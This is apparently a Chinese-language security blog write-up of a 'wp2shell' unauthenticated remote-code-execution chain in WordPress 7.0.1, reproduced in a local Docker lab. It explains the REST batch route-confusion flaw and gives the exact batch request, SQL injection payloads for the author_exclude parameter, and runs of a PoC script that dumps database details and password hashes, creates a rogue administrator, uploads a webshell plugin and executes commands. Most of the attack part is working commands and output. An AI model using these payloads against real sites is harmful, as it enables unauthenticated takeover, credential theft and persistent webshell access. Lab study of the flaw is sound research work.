---
title: WordPress 7.0.1 wp2shell RCE
description: WordPress 7.0.1 wp2shell 漏洞分析与利用

date: 2026-07-20T20:12:52+08:00
lastmod: 2026-08-23T20:15:52+08:00
---
# WordPress 7.0.1 wp2shell RCE!!!

## 漏洞原理

```
The wp2shell chain is caused by two independent WordPress Core mistakes.

The REST batch dispatcher keeps the matched route handlers and validation
results in parallel arrays. When wp_parse_url() rejects a sub-request path,
the error branch appends to the validation array but not to the matches array.
The arrays then become offset by one and a request is dispatched through a
handler that did not validate it.

The exploit first uses that confusion to dispatch a POST /wp/v2/posts request
as the batch handler, allowing a nested batch whose sub-requests use GET.
The nested request targets /wp/v2/posts/999999 with collection-only parameters
such as author_exclude. The item route does not validate those parameters, but
the confused posts collection handler consumes author_exclude and passes it to
WP_Query as author__not_in.

The vulnerable query path accepts a string where an integer ID list is expected.
The result is an unauthenticated boolean/time/UNION SQL injection. UNION rows
can be rendered as fake WP_Post objects, and the oEmbed/customizer request
chain turns the database primitive into a generated administrator. The final
command execution uses normal administrator plugin upload behavior.
```

WordPress 的 Batch 接口是：

```text
POST /wp-json/batch/v1
POST /?rest_route=/batch/v1
```

在 `serve_batch_request_v1()` 中，路由匹配结果和校验结果分别放在两个数组中。

当请求路径解析失败时，例如：

```json
{"method":"POST","path":"///"}
```

程序只向校验结果数组写入错误，没有向路由匹配数组写入对应的占位数据，后面的下标就错位了。

第一次利用这个错位，可以把：

```json
{
  "method": "POST",
  "path": "/wp/v2/posts",
  "body": {
    "requests": []
  }
}
```

当成 Batch 请求处理。

这样内层的请求就可以使用 `GET`。内层再请求：

```text
/wp/v2/posts/999999?author_exclude=...
```

`999999` 不需要真实存在，它只是用来匹配 Posts item route。`author_exclude` 本来是 Posts collection route 的参数，item route 不会校验它，但第二次错位以后，Posts collection 的 `get_items()` 会消费它：

```text
author_exclude  →  WP_Query::author__not_in
```

因此可以构造：

```text
author_exclude=-1) AND (1=1)-- -
```

或者：

```text
author_exclude=0) AND (SELECT 1 FROM (SELECT SLEEP(3))x)-- -
```

PoC 默认优先使用 UNION 读取。它把伪造的 `wp_posts` 行放入查询结果，再从 Posts REST 响应中的 `post_title` 取出：

```text
||HEX(value)||
```

完整的 SQLi-to-admin 流程是：

```text
UNION 伪造 WP_Post
        ↓
渲染 [embed]，生成真实 oEmbed cache 文章
        ↓
SQLi 读取 oEmbed 文章 ID
        ↓
伪造 customize_changeset、nav_menu_item、request 对象
        ↓
POST /wp/v2/users 创建 administrator
        ↓
管理员登录
        ↓
上传临时插件并执行 shell_exec
```

## 环境搭建

docker-compose.yml：

```yaml
services:
  db:
    image: mysql:8.0
    container_name: wp2shell-db
    command: --default-authentication-plugin=mysql_native_password
    environment:
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress
      MYSQL_ROOT_PASSWORD: rootpassword
    healthcheck:
      test: ["CMD-SHELL", "mysqladmin ping -h 127.0.0.1 -u root -p$$MYSQL_ROOT_PASSWORD --silent"]
      interval: 5s
      timeout: 5s
      retries: 30
    volumes:
      - db_data:/var/lib/mysql

  wordpress:
    build:
      context: .
      args:
        WORDPRESS_VERSION: "7.0.1"
    image: wp2shell-wordpress:7.0.1
    container_name: wp2shell-wordpress
    depends_on:
      db:
        condition: service_healthy
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress
      WORDPRESS_DB_NAME: wordpress
      WORDPRESS_CONFIG_EXTRA: |
        define('WP_AUTO_UPDATE_CORE', false);
    ports:
      - "8080:80"
    extra_hosts:
      - "host.docker.internal:host-gateway"
    volumes:
      - wordpress_data:/var/www/html

  wordpress-init:
    build:
      context: .
      args:
        WORDPRESS_VERSION: "7.0.1"
    image: wp2shell-wordpress:7.0.1
    container_name: wp2shell-wordpress-init
    depends_on:
      db:
        condition: service_healthy
      wordpress:
        condition: service_started
    environment:
      WORDPRESS_DB_HOST: db:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress
      WORDPRESS_DB_NAME: wordpress
      WP_URL: http://host.docker.internal:8080
      WP_ADMIN_USER: admin
      WP_ADMIN_PASSWORD: Wp2shell-Admin!2026
      WP_ADMIN_EMAIL: admin@wp2shell.invalid
    entrypoint: ["/bin/sh", "/usr/local/bin/init-wordpress.sh"]
    extra_hosts:
      - "host.docker.internal:host-gateway"
    volumes:
      - wordpress_data:/var/www/html

volumes:
  db_data:
  wordpress_data:
```

Dockerfile：

```dockerfile
FROM wordpress:php8.2-apache

ARG WORDPRESS_VERSION=7.0.1

ENV WP_CLI_ALLOW_ROOT=1

RUN set -eux; \
    apt-get update; \
    apt-get install -y --no-install-recommends ca-certificates curl default-mysql-client; \
    rm -rf /var/lib/apt/lists/*; \
    cp /usr/src/wordpress/wp-config-docker.php /tmp/wp-config-docker.php; \
    rm -rf /usr/src/wordpress; \
    mkdir -p /usr/src/wordpress; \
    curl -fsSL "https://wordpress.org/wordpress-${WORDPRESS_VERSION}.tar.gz" \
        | tar -xz --strip-components=1 -C /usr/src/wordpress; \
    cp /tmp/wp-config-docker.php /usr/src/wordpress/wp-config-docker.php; \
    rm /tmp/wp-config-docker.php; \
    curl -fsSL "https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar" \
        -o /usr/local/bin/wp; \
    chmod +x /usr/local/bin/wp; \
    wp --info --allow-root

COPY init-wordpress.sh /usr/local/bin/init-wordpress.sh
RUN chmod +x /usr/local/bin/init-wordpress.sh

WORKDIR /var/www/html
```

init-wordpress.sh：

```sh
#!/bin/sh
set -eu

WP_PATH=/var/www/html

echo '[*] waiting for WordPress files...'
until [ -f "$WP_PATH/wp-includes/version.php" ]; do
    sleep 2
done

echo '[*] waiting for the database...'
DB_HOST_NAME="${WORDPRESS_DB_HOST%%:*}"
DB_PORT="${WORDPRESS_DB_HOST##*:}"
if [ "$DB_PORT" = "$DB_HOST_NAME" ]; then
    DB_PORT=3306
fi
until mariadb-admin ping \
    --protocol=tcp \
    --host="$DB_HOST_NAME" \
    --port="$DB_PORT" \
    --user="$WORDPRESS_DB_USER" \
    --password="$WORDPRESS_DB_PASSWORD" \
    --skip-ssl \
    --silent >/dev/null 2>&1; do
    sleep 2
done

if ! wp core is-installed --allow-root --path="$WP_PATH" >/dev/null 2>&1; then
    echo '[*] installing WordPress 7.0.1...'
    wp core install \
        --allow-root \
        --path="$WP_PATH" \
        --url="${WP_URL}" \
        --title='wp2shell lab' \
        --admin_user="${WP_ADMIN_USER}" \
        --admin_password="${WP_ADMIN_PASSWORD}" \
        --admin_email="${WP_ADMIN_EMAIL}" \
        --skip-email

    wp post create \
        --allow-root \
        --path="$WP_PATH" \
        --post_title='wp2shell public post' \
        --post_content='wp2shell lab post' \
        --post_status=publish \
        --post_author=1 \
        --porcelain
else
    echo '[*] WordPress is already installed.'
fi

if [ -d "$WP_PATH/wp-content/uploads" ]; then
    chown -R www-data:www-data "$WP_PATH/wp-content/uploads"
fi

echo '[+] WordPress lab is ready.'
```

启动环境：

```powershell
cd D:\CTF\hack\CVE\wp2shell\docker
docker compose up --build -d
```

输出：

```text
wp2shell-wordpress:7.0.1  Built
Network docker_default  Created
Volume docker_wordpress_data  Created
Volume docker_db_data  Created
Container wp2shell-db  Started
Container wp2shell-wordpress  Started
Container wp2shell-wordpress-init  Started
```

查看日志：

```powershell
docker compose ps -a
docker compose logs --no-color wordpress-init
```

```text
wp2shell-wordpress-init  | [*] waiting for WordPress files...
wp2shell-wordpress-init  | [*] waiting for the database...
wp2shell-wordpress-init  | [*] installing WordPress 7.0.1...
wp2shell-wordpress-init  | Success: WordPress installed successfully.
wp2shell-wordpress-init  | 5
wp2shell-wordpress-init  | [+] WordPress lab is ready.
```

管理员：

```text
username: admin
password: Wp2shell-Admin!2026
url:      http://127.0.0.1:8080
```

## 漏洞POC复现

确认 WordPress 版本和 REST API：

```powershell
docker exec wp2shell-wordpress wp core version --allow-root --path=/var/www/html
curl.exe -i 'http://127.0.0.1:8080/?rest_route=/wp/v2/posts&per_page=1'
```

输出：

```text
7.0.1
HTTP/1.1 200 OK
X-WP-Total: 2
Content-Type: application/json; charset=UTF-8

[{"id":5,"date":"2026-08-23T02:43:...","slug":"wp2shell-public-post",...}]
```

服务正常

发送 Batch marker

```powershell
$body = @{
    requests = @(
        @{ method = 'POST'; path = '///' },
        @{ method = 'POST'; path = '/wp/v2/posts' },
        @{ method = 'POST'; path = '/wp/v2/block-renderer/core/archives' },
        @{ method = 'POST'; path = '/batch/v1'; body = @{ requests = @() } }
    )
} | ConvertTo-Json -Depth 10

$client = New-Object System.Net.WebClient
$client.Headers['Content-Type'] = 'application/json'
$client.UploadString(
    'http://127.0.0.1:8080/?rest_route=/batch/v1',
    'POST',
    $body
)
```

返回：

```json
{"responses":[
  {"body":{"code":"parse_path_failed","message":"Could not parse the path.","data":{"status":400}},"status":400,"headers":[]},
  {"body":{"code":"block_cannot_read","message":"Sorry, you are not allowed to read blocks as this user.","data":{"status":401}},"status":401,"headers":[]},
  {"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":{"Allow":"POST"}},
  {"body":{"code":"rest_batch_not_allowed","message":"The requested route does not support batch requests.","data":{"status":400}},"status":400,"headers":[]}
]}
```

HTTP 状态码是 207

使用 PoC 检测

```powershell
python .\wp2shell.py check http://127.0.0.1:8080
```

输出：

```text
[*] WordPress markers found (wp-content / wp-includes / wp-json)
[*] Public WordPress version hints:
    - 7.0.1 via HTML generator meta (wp2shell affected range) - WordPress 7.0.1
[!] A public version hint falls in the wp2shell affected range; verify internally or confirm with authorization.
[*] Batch probe -> HTTP 207; markers matched: parse_path_failed, block_cannot_read, rest_batch_not_allowed
[+] VULNERABLE — batch route-confusion behavior detected.
[*] SQLi confirmation not sent; use --confirm-sqli for the active SQLi probe.
```

确认 SQLi：

```powershell
python .\wp2shell.py check http://host.docker.internal:8080 --confirm-sqli
```

输出：

```text
[+] VULNERABLE — batch route-confusion behavior detected.
[+] SQLi confirmed — UNION fake-post read returned data.
```

读版本、数据库用户和数据库名：

```powershell
python .\wp2shell.py read http://host.docker.internal:8080 --preset fingerprint --technique union
```

输出：

```text
[+] UNION extraction available (in-band, one request per value) — using it.
[+] MySQL version: 8.0.46
[+] Database user: wordpress@%
[+] Database name: wordpress
[*] 4 request(s) sent.
```

读WordPress 用户：

```powershell
python .\wp2shell.py read http://host.docker.internal:8080 --preset users --technique union
```

输出：

```text
[+] UNION extraction available (in-band, one request per value) — using it.
[*] 1 user(s) in wp_users.
[+] 1|admin|$wp$2y$10$...
[*] 3 request(s) sent.
```

**RCE！！！**

```powershell
python .\wp2shell.py shell http://host.docker.internal:8080 --cmd id
```

输出：

```text
[!] This uploads a plugin containing a webshell to the target.
[!] No credentials supplied; attempting pre-auth administrator creation.
[*] Creating administrator through the SQLi-to-customizer bridge...
[+] Administrator created: wp2_3e1f1e04ca47
[+]     email:    wp2_3e1f1e04ca47@wp2shell.invalid
[+]     password: Wp2!qPibjt6r50ygSqDu27oZ
[*] Authenticating as 'wp2_3e1f1e04ca47'...
[+] Authenticated.
[*] Deploying webshell plugin...
[+] Webshell: http://host.docker.internal:8080/wp-content/plugins/wp2shell_be324c7c/wp2shell_be324c7c.php

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Deleting generated administrator...
[+] Generated administrator removed from the target.
[*] Cleaning up webshell...
[+] Webshell removed from the target.
```

复现成功

起交互式shell：

```powershell
python .\wp2shell.py shell http://host.docker.internal:8080 -i
```

---

ps:这个漏洞有意思在于它并不是一个单独的文件上传漏洞，而是先通过 Batch 路由错位把参数送进 SQL，再利用 WordPress 自己的文章渲染、oEmbed 和用户接口完成提权，最后才回到普通的管理员插件上传。攻击者不需要登录，也不需要安装第三方插件。
